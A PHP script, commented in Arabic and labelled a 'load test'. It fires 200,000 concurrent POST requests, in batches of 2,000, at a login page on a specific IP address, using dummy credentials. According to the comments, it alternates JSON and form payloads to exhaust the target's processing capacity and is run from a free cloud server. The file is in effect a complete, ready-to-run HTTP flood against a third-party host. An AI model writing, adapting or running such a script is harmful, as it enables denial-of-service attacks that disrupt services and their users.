<?php
// 1. تفعيل التخزين المؤقت وضبط بيئة السكربت القصوى
ob_start();
set_time_limit(0);
ignore_user_abort(true);

// ضبط ترويسات التدفق الفوري الفائقة لمنع التخزين المؤقت
header('Content-Type: text/html; charset=utf-8');
header('X-Accel-Encoding: none'); 
header('Cache-Control: no-cache, must-revalidate');

if (ob_get_length()) {
    ob_end_clean();
}
// قذف حشو بيانات أولي لتنشيط تدفق الشاشة المباشر في متصفحات كروم وفايرفوكس
echo str_repeat(' ', 1024); 
flush();

// 2. هندسة البيانات الفائقة المتوافقة مع كافة أنواع السيرفرات والمنافذ
$target_url = "http://187.7.17.67/sudani/login2.php";

$payload_data = [
    'account'         => '123456789',
    'account_number'  => '123456789',
    'accountNumber'   => '123456789',
    'username'        => '123456789',
    'phone'           => '123456789',
    'phoneNumber'     => '123456789',
    'password'        => 'test_password'
];

// تجهيز الصيغتين في الذاكرة لتسريع قذف البيانات
$form_payload = http_build_query($payload_data);
$json_payload = json_encode($payload_data);

// 3. إعدادات الحمل المكثف لـ 2,000 طلب متوازي في الدفعة الواحدة (طاقة توازي قصوى)
$concurrency_batch = 2000;  
$total_batches     = 100;   

echo "<h2>⚡ إطلاق محرك اختبار الحمل الفائق والقصي (Hyper cURL Multi Performance)</h2>";
echo "⚙️ حالة التدفق: <b>نشط بكفاءة 100%</b> | إجمالي الطلبات المستهدفة: <b>" . number_format($concurrency_batch * $total_batches) . " طلب متزامن</b>.<br>";
echo "---------------------------------------------------------------------------------<br><br>";
flush();

// 4. حلقة المعالجة والضغط النفاث
for ($batch = 1; $batch <= $total_batches; $batch++) {
    
    echo "🚀 <b>قذف الدفعة النفاثة رقم [ {$batch} / {$total_batches} ]</b>... ";
    flush();
    
    $mh = curl_multi_init();
    
    // تفعيل إعدادات كفاءة تدفق الأنابيب للـ cURL المتعدد لمنع استهلاك المعالج
    if (function_exists('curl_multi_setopt')) {
        @curl_multi_setopt($mh, CURLMOPT_PIPELINING, 1);
        @curl_multi_setopt($mh, CURLMOPT_MAX_TOTAL_CONNECTIONS, 500);
    }
    
    $handles = [];

    for ($i = 0; $i < $concurrency_batch; $i++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $target_url);
        curl_setopt($ch, CURLOPT_POST, true);
        
        // بالتناوب بين الصيغتين لضمان إشغال قدرة المعالجة للمستهدف
        if ($i % 2 === 0) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $json_payload);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Content-Type: application/json',
                'Accept: application/json',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Connection: keep-alive'
            ]);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $form_payload);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Content-Type: application/x-www-form-urlencoded',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Connection: keep-alive'
            ]);
        }
        
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3); // وقت انتهاء سريع 3 ثواني لقذف الطلبات دون تعليق الذاكرة
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1); // تسريع المعالجة على سيرفرات لينكس السحابية
        
        curl_multi_add_handle($mh, $ch);
        $handles[] = $ch;
    }

    // تشغيل القنوات وإرسال الدفعة بالكامل في نفس الميكرو ثانية
    $running = null;
    do {
        $status = curl_multi_exec($mh, $running);
        if ($running > 0) {
            curl_multi_select($mh, 0.1); // فحص سريع جداً كل 100 مللي ثانية للتفريغ الفوري
        }
    } while ($running > 0 && $status == CURLM_CALL_MULTI_PERFORM || $running);

    // تجميع الإحصائيات السريعة وتفريغ الذاكرة فوراً لعدم إجهاد سيرفر Render مجاناً
    $success_200 = 0;
    $other_codes = 0;

    foreach ($handles as $ch) {
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($http_code == 200) {
            $success_200++;
        } else {
            $other_codes++;
        }
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh);

    // تحديث الشاشة فورياً بالنتائج
    echo "📊 حالة الحمل: (✅ ناجح 200: <b>{$success_200}</b> | ❌ قيود/انقطاع: <b>{$other_codes}</b>)<br>";
    flush();

    // فاصل ميكروي ذكي مستقر (50 مللي ثانية) لتهيئة كرت شبكة السيرفر السحابي للدفعة التالية
    usleep(50000); 
}

echo "<br>🏁 <b>تم إنجاز الاختبار الفائق بالكامل، وتم إرسال كافة الدفعات بأقصى طاقة استيعابية للشبكة.</b>";
flush();
?>
